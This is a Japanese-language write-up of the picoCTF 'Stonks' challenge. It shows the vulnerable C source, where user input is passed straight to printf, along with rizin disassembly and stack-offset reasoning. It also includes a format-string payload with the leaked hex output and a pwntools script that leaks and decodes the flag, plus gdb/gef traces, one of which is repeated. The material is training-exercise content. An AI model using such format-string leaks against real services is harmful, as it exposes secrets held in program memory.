---
title: picoCTF "Stonks" writeup
date: 2021-12-13
---

ソースコードが与えられるので読んでみると`buy_stonks`関数で以下のことがわかる。

1. ファイル`api`からフラグを読み込んでスタック上の変数`api_buf`に格納している
2. FSAができる箇所がある


```
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f); // <- [1]

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf); // <- [2]

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```

`gcc`でコンパイルしてリバースすると`buy_stonks`関数のスタックレイアウトは以下のようになる。


```
$ gcc vuln.c -o vuln
```

```
$ rizin ./vlun
[0x00001220]> aaa
[0x00001220]> pdf@sym.buy_stonks

            ; CALL XREF from main @ 0x17ce
┌ sym.buy_stonks (uint64_t arg1);
│           ; var uint64_t var_b8h @ rbp-0xb8
│           ; var int64_t var_b0h @ rbp-0xb0
│           ; var int64_t var_ach @ rbp-0xac
│           ; var FILE *stream @ rbp-0xa8
│           ; var int64_t var_a0h @ rbp-0xa0
│           ; var const char *format @ rbp-0x98
│           ; var char *s @ rbp-0x90
│           ; var int64_t canary @ rbp-0x8
│           ; arg uint64_t arg1 @ rdi
│           0x0000148e      endbr64
│           0x00001492      push  rbp
│           0x00001493      mov   rbp, rsp
│           0x00001496      sub   rsp, 0xc0
│           0x0000149d      mov   qword [var_b8h], rdi                 ; arg1
│           0x000014a4      mov   rax, qword fs:[0x28]
│           0x000014ad      mov   qword [canary], rax
│           0x000014b1      xor   eax, eax
│           0x000014b3      cmp   qword [var_b8h], 0
│       ┌─< 0x000014bb      jne   0x14c7
│       │   0x000014bd      mov   eax, 1
│      ┌──< 0x000014c2      jmp   0x162e
│      ││   ; CODE XREF from sym.buy_stonks @ 0x14bb
│      │└─> 0x000014c7      lea   rsi, [0x0000204c]                    ; "r" ; const char *mode
│      │    0x000014ce      lea   rdi, [0x0000204e]                    ; "api" ; const char *filename
│      │    0x000014d5      call  sym.imp.fopen                        ; FILE *fopen(const char *filename, const char *mode)
│      │    0x000014da      mov   qword [stream], rax
│      │    0x000014e1      cmp   qword [stream], 0
│      │┌─< 0x000014e9      jne   0x1501
│      ││   0x000014eb      lea   rdi, str.Flag_file_not_found._Contact_an_admin. ; 0x2058 ; "Flag file not found. Contact an admin." ; const char *s
│      ││   0x000014f2      call  sym.imp.puts                         ; int puts(const char *s)
│      ││   0x000014f7      mov   edi, 1                               ; int status
│      ││   0x000014fc      call  sym.imp.exit                         ; void exit(int status)
│      ││   ; CODE XREF from sym.buy_stonks @ 0x14e9
│      │└─> 0x00001501      mov   rdx, qword [stream]                  ; FILE *stream
│      │    0x00001508      lea   rax, [s]
│      │    0x0000150f      mov   esi, 0x80                            ; int size
│      │    0x00001514      mov   rdi, rax                             ; char *s
│      │    0x00001517      call  sym.imp.fgets                        ; char *fgets(char *s, int size, FILE *stream)
│      │    0x0000151c      mov   rax, qword [var_b8h]
│      │    0x00001523      mov   eax, dword [rax]
│      │    0x00001525      mov   dword [var_b0h], eax
│      │    0x0000152b      mov   dword [var_ach], 0
│      │    0x00001535      mov   qword [var_a0h], 0
│      │    0x00001540      lea   rdi, str.Using_patented_AI_algorithms_to_buy_stonks ; 0x2080 ; "Using patented AI algorithms to buy stonks" ; const char *s
│      │    0x00001547      call  sym.imp.puts                         ; int puts(const char *s)
│      │┌─< 0x0000154c      jmp   0x15ad
│      ││   ; CODE XREF from sym.buy_stonks @ 0x15b4
│     ┌───> 0x0000154e      call  sym.imp.rand                         ; int rand(void)
│     ╎││   0x00001553      cdq
│     ╎││   0x00001554      idiv  dword [var_b0h]
│     ╎││   0x0000155a      mov   eax, edx
│     ╎││   0x0000155c      add   eax, 1
│     ╎││   0x0000155f      mov   dword [var_ach], eax
│     ╎││   0x00001565      mov   eax, dword [var_ach]
│     ╎││   0x0000156b      mov   edi, eax                             ; int64_t arg1
│     ╎││   0x0000156d      call  sym.pick_symbol_with_AI
│     ╎││   0x00001572      mov   qword [var_a0h], rax
│     ╎││   0x00001579      mov   rax, qword [var_b8h]
│     ╎││   0x00001580      mov   rdx, qword [rax + 8]
│     ╎││   0x00001584      mov   rax, qword [var_a0h]
│     ╎││   0x0000158b      mov   qword [rax + 0x10], rdx
│     ╎││   0x0000158f      mov   rax, qword [var_b8h]
│     ╎││   0x00001596      mov   rdx, qword [var_a0h]
│     ╎││   0x0000159d      mov   qword [rax + 8], rdx
│     ╎││   0x000015a1      mov   eax, dword [var_ach]
│     ╎││   0x000015a7      sub   dword [var_b0h], eax
│     ╎││   ; CODE XREF from sym.buy_stonks @ 0x154c
│     ╎│└─> 0x000015ad      cmp   dword [var_b0h], 0
│     └───< 0x000015b4      jg    0x154e
│      │    0x000015b6      lea   rdi, str.Stonks_chosen               ; 0x20ab ; "Stonks chosen" ; const char *s
│      │    0x000015bd      call  sym.imp.puts                         ; int puts(const char *s)
│      │    0x000015c2      mov   edi, 0x12d                           ; size_t size
│      │    0x000015c7      call  sym.imp.malloc                       ; void *malloc(size_t size)
│      │    0x000015cc      mov   qword [format], rax
│      │    0x000015d3      lea   rdi, str.What_is_your_API_token      ; 0x20b9 ; "What is your API token?" ; const char *s
│      │    0x000015da      call  sym.imp.puts                         ; int puts(const char *s)
│      │    0x000015df      mov   rax, qword [format]
│      │    0x000015e6      mov   rsi, rax
│      │    0x000015e9      lea   rdi, str.300s                        ; 0x20d1 ; "%300s" ; const char *format
│      │    0x000015f0      mov   eax, 0
│      │    0x000015f5      call  sym.imp.__isoc99_scanf               ; int scanf(const char *format)
│      │    0x000015fa      lea   rdi, str.Buying_stonks_with_token:   ; 0x20d7 ; "Buying stonks with token:" ; const char *s
│      │    0x00001601      call  sym.imp.puts                         ; int puts(const char *s)
│      │    0x00001606      mov   rax, qword [format]
│      │    0x0000160d      mov   rdi, rax                             ; const char *format
│      │    0x00001610      mov   eax, 0
│      │    0x00001615      call  sym.imp.printf                       ; int printf(const char *format)
│      │    0x0000161a      mov   rax, qword [var_b8h]
│      │    0x00001621      mov   rdi, rax                             ; uint64_t arg1
│      │    0x00001624      call  sym.view_portfolio
│      │    0x00001629      mov   eax, 0
│      │    ; CODE XREF from sym.buy_stonks @ 0x14c2
│      └──> 0x0000162e      mov   rcx, qword [canary]
│           0x00001632      xor   rcx, qword fs:[0x28]
│       ┌─< 0x0000163b      je    0x1642
│       │   0x0000163d      call  sym.imp.__stack_chk_fail             ; void __stack_chk_fail(void)
│       │   ; CODE XREF from sym.buy_stonks @ 0x163b
│       └─> 0x00001642      leave
└           0x00001643      ret



```

## 解法

変数`char *s`はフラグが格納されるbufferで`rbp - 0x90`の位置にある。
`rsp`は`rbp - 0xc0`の位置にあるので`rsp`からのオフセットは`0xc0 - 0x90 = 0x30`10進数で`48`にあたる。
64ビットなら`48 / 8 = 6`なので`%5$lx`としたいが、x86-64では関数の呼び出し規約で6つの引数がレジスタに格納されるのでスタックに参照できるのは引数で数えると7番目から。
`7 + 6 = 13`つまりフラグが格納されている箇所は`%12$lx`あたりから始まる。

```
$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%11$lx.%12$lx.%13$lx.%14$lx.%15$lx.%16$lx.%17$lx.%18$lx.%19$lx.%20$lx.%21$lx.%22$lx.%23$lx.%24$lx.%25$lx
Buying stonks with token:
84db180.1.84dc450.84dc470.6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.63343261.36613431.ff83007d.f7f5baf8
Portfolio as of Fri Dec 10 07:26:45 UTC 2021


1 shares of IB
1 shares of OE
4 shares of TOKY
2 shares of WC
19 shares of BFWL
4 shares of D
17 shares of JHNB
1 shares of QBAC
6 shares of PHYD
1437 shares of VJG
Goodbye!

```

`%15$lx`で表示した`6f636970`は`ocip`の16進数値、`%16$lx`で表示した`7b465443`は`{FTC`の16進数値なのでこの辺りにフラグがあることがわかる。

## 解答

```
#!/usr/bin/env python3
from pwn import *

context(os = 'linux', arch = 'amd64')

def conv(hex_val):
    letters = ''
    for i in range(3, -1, -1):
        c = chr(hex_val[i * 2]) + chr(hex_val[i * 2 + 1])
        c = chr(int(c, 16))
        letters += c
    return letters

def main():
    flag = ''
    for i in range(15, 25):
        conn = remote('mercury.picoctf.net', 33411)

        payload = '%' + str(i)  + '$lx'
        payload = bytes(payload.encode('utf-8'))

        conn.recvuntil(b'my portfolio\n')
        conn.sendline(b'1')
        conn.recvuntil(b'API token?\n')
        conn.sendline(payload)
        conn.recvuntil(b'with token:\n')
        hex_flag = conn.recvline()[:-1]
        assert(len(hex_flag) == 8)
        print(hex_flag)
        flag += conv(hex_flag)
        print(flag)

if __name__ == '__main__':
    main()
```


## 別アプローチ
最終的にFSAをするのは同じ。
フラグの格納場所を探すためにgdbでブレークポイントを張って実行すればフラグが格納されているbufferのrspからのオフセットがわかる。

```
echo "picoCTF{flag} > api"
gdb -q ./vuln
gef➤  disass buy_stonks 
Dump of assembler code for function buy_stonks:
   (..snip)
   0x0000000000001606 <+376>:	mov    rax,QWORD PTR [rbp-0x98]
   0x000000000000160d <+383>:	mov    rdi,rax
   0x0000000000001610 <+386>:	mov    eax,0x0
   0x0000000000001615 <+391>:	call   0x1180 <printf@plt>
   0x000000000000161a <+396>:	mov    rax,QWORD PTR [rbp-0xb8]
   0x0000000000001621 <+403>:	mov    rdi,rax
   (..snip)
End of assembler dump.
gef➤ b *buy_stonks + 391
gef➤  r
Starting program: /path/to/stonks/vuln 
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
aaaaaaaa
Buying stonks with token:
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7af2224  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dcf8c0  →  0x0000000000000000
$rsp   : 0x00007fffffffdc50  →  0x00007fffffffdc60  →  0x0000000100000000
$rbp   : 0x00007fffffffdd10  →  0x00007fffffffdd50  →  0x0000555555555810  →  <__libc_csu_init+0> endbr64 
$rsi   : 0x00007ffff7dce7e3  →  0xdcf8c0000000000a ("\n"?)
$rdi   : 0x000055555555a9b0  →  "aaaaaaaa"
$rip   : 0x0000555555555615  →  <buy_stonks+391> call 0x555555555180 <printf@plt>
$r8    : 0x19              
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x0000555555555220  →  <_start+0> endbr64 
$r13   : 0x00007fffffffde30  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc50│+0x0000: 0x00007fffffffdc60  →  0x0000000100000000	 ← $rsp
0x00007fffffffdc58│+0x0008: 0x0000555555559260  →  0x00000000000003f6
0x00007fffffffdc60│+0x0010: 0x0000000100000000
0x00007fffffffdc68│+0x0018: 0x0000555555559690  →  0x00000000fbad2488
0x00007fffffffdc70│+0x0020: 0x000055555555a990  →  0x0000434900000001
0x00007fffffffdc78│+0x0028: 0x000055555555a9b0  →  "aaaaaaaa"
0x00007fffffffdc80│+0x0030: "picoCTF{flag}\n"
0x00007fffffffdc88│+0x0038: 0x00000a7d67616c66 ("flag}\n"?)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555606 <buy_stonks+376> mov    rax, QWORD PTR [rbp-0x98]
   0x55555555560d <buy_stonks+383> mov    rdi, rax
   0x555555555610 <buy_stonks+386> mov    eax, 0x0
 → 0x555555555615 <buy_stonks+391> call   0x555555555180 <printf@plt>
   ↳  0x555555555180 <printf@plt+0>   endbr64 
      0x555555555184 <printf@plt+4>   bnd    jmp QWORD PTR [rip+0x2dfd]        # 0x555555557f88
      0x55555555518b <printf@plt+11>  nop    DWORD PTR [rax+rax*1+0x0]
      0x555555555190 <srand@plt+0>    endbr64 
      0x555555555194 <srand@plt+4>    bnd    jmp QWORD PTR [rip+0x2df5]        # 0x555555557f90
      0x55555555519b <srand@plt+11>   nop    DWORD PTR [rax+rax*1+0x0]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   $rdi = 0x000055555555a9b0 → "aaaaaaaa",
   $rsi = 0x00007ffff7dce7e3 → 0xdcf8c0000000000a ("\n"?),
   $rdx = 0x00007ffff7dcf8c0 → 0x0000000000000000,
   $rcx = 0x00007ffff7af2224 → 0x5477fffff0003d48 ("H="?)
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x555555555615 in buy_stonks (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555615 → buy_stonks()
[#1] 0x5555555557d3 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7af2224  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dcf8c0  →  0x0000000000000000
$rsp   : 0x00007fffffffdc50  →  0x00007fffffffdc60  →  0x0000000100000000
$rbp   : 0x00007fffffffdd10  →  0x00007fffffffdd50  →  0x0000555555555810  →  <__libc_csu_init+0> endbr64 
$rsi   : 0x00007ffff7dce7e3  →  0xdcf8c0000000000a ("\n"?)
$rdi   : 0x000055555555a9b0  →  "aaaaaaaa"
$rip   : 0x0000555555555615  →  <buy_stonks+391> call 0x555555555180 <printf@plt>
$r8    : 0x19              
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x0000555555555220  →  <_start+0> endbr64 
$r13   : 0x00007fffffffde30  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc50│+0x0000: 0x00007fffffffdc60  →  0x0000000100000000	 ← $rsp
0x00007fffffffdc58│+0x0008: 0x0000555555559260  →  0x00000000000003f6
0x00007fffffffdc60│+0x0010: 0x0000000100000000
0x00007fffffffdc68│+0x0018: 0x0000555555559690  →  0x00000000fbad2488
0x00007fffffffdc70│+0x0020: 0x000055555555a990  →  0x0000434900000001
0x00007fffffffdc78│+0x0028: 0x000055555555a9b0  →  "aaaaaaaa"
0x00007fffffffdc80│+0x0030: "picoCTF{flag}\n"
0x00007fffffffdc88│+0x0038: 0x00000a7d67616c66 ("flag}\n"?)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555606 <buy_stonks+376> mov    rax, QWORD PTR [rbp-0x98]
   0x55555555560d <buy_stonks+383> mov    rdi, rax
   0x555555555610 <buy_stonks+386> mov    eax, 0x0
 → 0x555555555615 <buy_stonks+391> call   0x555555555180 <printf@plt>
   ↳  0x555555555180 <printf@plt+0>   endbr64 
      0x555555555184 <printf@plt+4>   bnd    jmp QWORD PTR [rip+0x2dfd]        # 0x555555557f88
      0x55555555518b <printf@plt+11>  nop    DWORD PTR [rax+rax*1+0x0]
      0x555555555190 <srand@plt+0>    endbr64 
      0x555555555194 <srand@plt+4>    bnd    jmp QWORD PTR [rip+0x2df5]        # 0x555555557f90
      0x55555555519b <srand@plt+11>   nop    DWORD PTR [rax+rax*1+0x0]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   $rdi = 0x000055555555a9b0 → "aaaaaaaa",
   $rsi = 0x00007ffff7dce7e3 → 0xdcf8c0000000000a ("\n"?),
   $rdx = 0x00007ffff7dcf8c0 → 0x0000000000000000,
   $rcx = 0x00007ffff7af2224 → 0x5477fffff0003d48 ("H="?)
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x555555555615 in buy_stonks (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555615 → buy_stonks()
[#1] 0x5555555557d3 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x0000555555555615 in buy_stonks ()
gef➤ 
```

